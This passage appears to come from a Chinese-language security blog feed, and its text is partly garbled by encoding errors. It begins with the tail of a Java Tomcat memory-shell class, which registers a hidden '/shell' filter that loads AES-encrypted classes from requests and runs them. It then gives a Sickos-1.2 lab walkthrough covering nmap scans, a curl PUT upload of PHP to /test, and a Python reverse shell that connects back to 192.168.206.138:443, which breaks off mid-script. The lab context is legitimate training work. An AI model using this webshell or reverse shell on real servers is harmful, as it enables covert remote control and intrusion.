                <span class="token class-name">Lclass</span> <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>RushThere</span><span class="token punctuation">(</span><span class="token class-name">Lclass</span><span class="token punctuation">,</span> cl<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Lclass</span> <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>RushThere</span><span class="token punctuation">(</span><span class="token class-name">Lclass</span><span class="token punctuation">,</span> cl<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">RushThere</span><span class="token punctuation">(</span><span class="token class-name">Class</span> <span class="token class-name">Lclass</span><span class="token punctuation">,</span> <span class="token class-name">ClassLoader</span> cl<span class="token punctuation">,</span> <span class="token class-name">HttpSession</span> session<span class="token punctuation">,</span> <span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> pageContext<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytecode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Method</span> define <span class="token operator">=</span> <span class="token class-name">Lclass</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"defineClass"</span><span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token constant">TYPE</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token constant">TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            define<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Class</span> uclass <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                uclass <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"U"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> var18<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                uclass <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span>define<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>cl<span class="token punctuation">,</span> bytecode<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytecode<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> uclass<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Object</span> u <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Method</span> <span class="token class-name">Um</span> <span class="token operator">=</span> uclass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Um</span><span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> k <span class="token operator">=</span> <span class="token string">"3ad2fddfe8bad8e6"</span><span class="token punctuation">;</span>
            session<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"u"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Cipher</span> c <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            c<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">SecretKeySpec</span><span class="token punctuation">(</span>k<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> eClassBytes <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BASE64Decoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decodeBuffer</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Class</span> eclass <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span><span class="token class-name">Um</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> eClassBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Object</span> a <span class="token operator">=</span> eclass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Method</span> b <span class="token operator">=</span> eclass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"equals"</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            b<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            b<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var19<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token string">"AutomneGreet"</span><span class="token punctuation">;</span>
            <span class="token class-name">WebappClassLoaderBase</span> webappClassLoaderBase <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">WebappClassLoaderBase</span><span class="token punctuation">)</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span>webappClassLoaderBase<span class="token punctuation">.</span><span class="token function">getResources</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Field</span> <span class="token class-name">Configs</span> <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.catalina.core.StandardContext"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"filterConfigs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Configs</span><span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Map</span> filterConfigs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span><span class="token class-name">Configs</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>filterConfigs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"AutomneGreet"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Filter</span> filter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IceShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">FilterDef</span> filterDef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                filterDef<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span>filter<span class="token punctuation">)</span><span class="token punctuation">;</span>
                filterDef<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span><span class="token string">"AutomneGreet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                filterDef<span class="token punctuation">.</span><span class="token function">setFilterClass</span><span class="token punctuation">(</span>filter<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                standardContext<span class="token punctuation">.</span><span class="token function">addFilterDef</span><span class="token punctuation">(</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">FilterMap</span> filterMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                filterMap<span class="token punctuation">.</span><span class="token function">addURLPattern</span><span class="token punctuation">(</span><span class="token string">"/shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                filterMap<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span><span class="token string">"AutomneGreet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                filterMap<span class="token punctuation">.</span><span class="token function">setDispatcher</span><span class="token punctuation">(</span><span class="token class-name">DispatcherType</span><span class="token punctuation">.</span><span class="token constant">REQUEST</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                standardContext<span class="token punctuation">.</span><span class="token function">addFilterMapBefore</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">FilterDef</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">ApplicationFilterConfig</span> filterConfig <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">)</span>constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">,</span> filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>
                filterConfigs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"AutomneGreet"</span><span class="token punctuation">,</span> filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var10<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Sickos-1.2</title>
    <url>/2024/03/18/Sickos-1-2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="å‘ç°ä¸»æœº"><a href="#å‘ç°ä¸»æœº" class="headerlink" title="å‘ç°ä¸»æœº"></a>å‘ç°ä¸»æœº</h2><blockquote>
<p>nmap 192.168.206.138&#x2F;24</p>
</blockquote>
<p>å‘ç°ä¸»æœº192.168.206.157</p>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><blockquote>
<p>nmap 192.168.206.157 -p- -A -sS</p>
</blockquote>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.206.157
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0011s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65533</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">5</span>.9p1 Debian 5ubuntu1.8 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">1024</span> <span class="token number">66</span>:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 <span class="token punctuation">(</span>DSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">2048</span> ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    lighttpd <span class="token number">1.4</span>.28
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">)</span>.
<span class="token operator">|</span>_http-server-header: lighttpd/1.4.28
MAC Address: 00:0C:29:0B:25:C7 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
Device type: general purpose
Running: Linux <span class="token number">3</span>.X<span class="token operator">|</span><span class="token number">4</span>.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux <span class="token number">3.10</span> - <span class="token number">4.11</span>, Linux <span class="token number">3.16</span> - <span class="token number">4.6</span>, Linux <span class="token number">3.2</span> - <span class="token number">4.9</span>, Linux <span class="token number">4.4</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">1.09</span> ms <span class="token number">192.168</span>.206.157

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">117.00</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ä»ä¸Šé¢å¯ä»¥çœ‹åˆ°ä½¿ç”¨äº†webæœåŠ¡å™¨lighttpd&#x2F;1.4.28ï¼Œå¼€æ”¾äº†22å’Œ80ç«¯å£ï¼Œå°è¯•æœç´¢lighttpd&#x2F;1.4.28æ˜¯å¦å­˜åœ¨æ¼æ´<br><img src="https://img-blog.csdnimg.cn/direct/4fb3bdb0befc46b1a6eb89cf31b44619.png" alt="132"><br>å°è¯•mod_userdir Information Disclosureå‘ç°ä¹Ÿä¸å¯ä»¥</p>
<p>æ‰«ææœŸé—´å…ˆçœ‹çœ‹httpæœåŠ¡ï¼ŒæŸ¥çœ‹æºä»£ç æ²¡æœ‰ä»»ä½•å‘ç°ï¼Œæ‰«ä¸€ä¸‹ç›®å½•</p>
<blockquote>
<p>dirsearch -u <a href="http://192.168.206.157/">http://192.168.206.157/</a></p>
</blockquote>
<p>æ‰«æç»“æœï¼š<br><img src="https://img-blog.csdnimg.cn/direct/e04aee37b3064b23ada3bf552163d9b7.png" alt="lighttpd/1.4.28"><br>å‘ç°å­˜åœ¨ä¸€ä¸ªç›®å½•testï¼Œè®¿é—®çœ‹çœ‹ç›®å½•ä¸‹æ— æ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/direct/620462a816814f1ab3b0e1bfe8f185f3.png" alt="123"></p>
<p>æ—¢ç„¶æ— æ–‡ä»¶é‚£ä¹ˆèƒ½å¤Ÿä¸Šä¼ æ–‡ä»¶å—</p>
<h2 id="ä¸Šä¼ æœ¨é©¬"><a href="#ä¸Šä¼ æœ¨é©¬" class="headerlink" title="ä¸Šä¼ æœ¨é©¬"></a>ä¸Šä¼ æœ¨é©¬</h2><p>è¿™æ˜¯é‡è¦çš„ä¸€æ­¥ï¼Œè‡ªå·±åšçš„æ—¶å€™æ²¡æœ‰å¾€è¿™æ–¹é¢æƒ³ã€‚<br>é‚£ä¹ˆè¯¥å¦‚ä½•çŸ¥é“æ˜¯å¦å¯ä»¥ä¸Šä¼ æ–‡ä»¶å‘¢ï¼Ÿ<br>æŸ¥çœ‹&#x2F;testç›®å½•æ”¯æŒçš„æ–¹æ³•</p>
<blockquote>
<p><code>nmap --script http-methods --script-args http-methods.url-path=&#39;/test&#39; 192.168.206.157</code><br><img src="https://img-blog.csdnimg.cn/direct/a494d6fdf7a54f3390350e5e975b771e.png" alt="123"></p>
</blockquote>
<p>burpæŠ“åŒ…å‘é€OPTIONSè¯·æ±‚ï¼š<br><img src="https://img-blog.csdnimg.cn/direct/3bbc61a3d87c49b698b35495dc301085.png" alt="123"></p>
<p>curlå‘é€OPTIONSè¯·æ±‚ï¼š</p>
<blockquote>
<p><code>curl  -v -X OPTIONS http://192.168.206.157/test/</code><br><img src="https://img-blog.csdnimg.cn/direct/68d04e5de38346b6a0d9a96d6723bcb5.png" alt="123"></p>
</blockquote>
<p>ä»¥ä¸Šæ–¹æ³•éƒ½å¯ä»¥æŸ¥çœ‹æ¥å—çš„è¯·æ±‚æ–¹æ³•ã€‚æ¥å—PUTæ–¹æ³•å°±æ˜¯æˆ‘ä»¬å¯ä»¥ä»¥PUTæ–¹æ³•å†™å…¥æ–‡ä»¶ã€‚å°è¯•ä¸€ä¸‹ï¼š</p>
<blockquote>
<p><code>curl -v -X PUT -d &quot;&lt;?php phpinfo();?&gt;&quot; http://192.168.206.157/test/shell.php</code></p>
</blockquote>
<p>å‘ç°å·²ç»æˆåŠŸå†™å…¥æ–‡ä»¶ï¼Œé‚£ä¹ˆå¼€å§‹å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œæˆ–è€…ç›´æ¥ä¼ å…¥phpåå¼¹shellçš„æ–‡ä»¶ã€‚<br><img src="https://img-blog.csdnimg.cn/direct/2f5bbf15aa8749ba9633546cf7d45bb3.png" alt="132"></p>
<p>ä½¿ç”¨èšå‰‘è¿æ¥é¶æœºï¼Œç›®å‰æƒé™ä¸ºwww-dataã€‚æ”¶é›†ä¿¡æ¯è¿›è¡Œææƒã€‚</p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ä¸Šä¼ linuxä¿¡æ¯æ”¶é›†è„šæœ¬ï¼š<br>è¿è¡Œæ”¶é›†ä¿¡æ¯æ—¶æ–‡ä»¶ä¸å¥½çœ‹ï¼Œå°è¯•å…ˆåå¼¹é‚£ä¸€ä¸ªshellï¼Œå†è¿›è¡Œä¿¡æ¯æ”¶é›†ã€‚å†åˆ›å»ºä¸€ä¸ªåå¼¹shellæ–‡ä»¶ï¼Œå°è¯•äº†å‡ ä¸ªè„šæœ¬å‘ç°éƒ½ä¸è¡Œï¼Œæœ€åæ‰¾åˆ°è¿™ä¸ªè„šæœ¬ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os
s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"192.168.206.138"</span><span class="token punctuation">,</span><span class="token number">443</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
